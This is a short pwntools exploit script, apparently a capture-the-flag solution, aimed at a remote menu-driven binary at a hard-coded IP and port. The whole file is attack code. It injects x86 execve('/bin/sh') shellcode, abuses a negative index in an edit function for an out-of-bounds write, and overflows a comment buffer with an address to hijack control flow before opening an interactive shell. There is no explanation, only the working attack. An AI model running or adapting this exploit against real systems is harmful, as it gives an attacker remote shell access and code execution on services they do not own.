from pwn import *
#s = remote('192.168.0.85',1234)
s = remote('35.187.198.163', 36652)
def write(age,name,about):
  s.recvuntil('=>')
  s.send('1\n')
  s.recvuntil('age:')
  s.send(str(age)+'\n')
  s.recvuntil('name:')
  s.send(name)
  s.recvuntil('About her(introduce):')
  s.send(about)
def edit(index,age,name,about):
  s.recvuntil('=>')
  s.send('2\n')
  s.recvuntil('page:')
  s.send(str(index)+'\n')
  s.recvuntil('age:')
  s.send(str(age)+'\n')
  s.recvuntil('name:')
  s.send(name)
  s.recvuntil('About her(introduce):')
  s.send(about)
def comment(id_,comment_,password_):
  s.recvuntil('=>')
  s.send('5\n')
  s.recvuntil('id :')
  s.send(id_)
  s.recvuntil('comment :')
  s.send(comment_)
  s.recvuntil('password:')
  s.send(str(password_)+'\n')
raw_input()
sc2 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
write(1,'1234',sc2)
edit(-0xf6,1,'A'*0xa,'A'*0x64)
comment('1234','A'*(0xd4-0x10)+p64(0x804B018),0x804b0d2)
s.interactive()
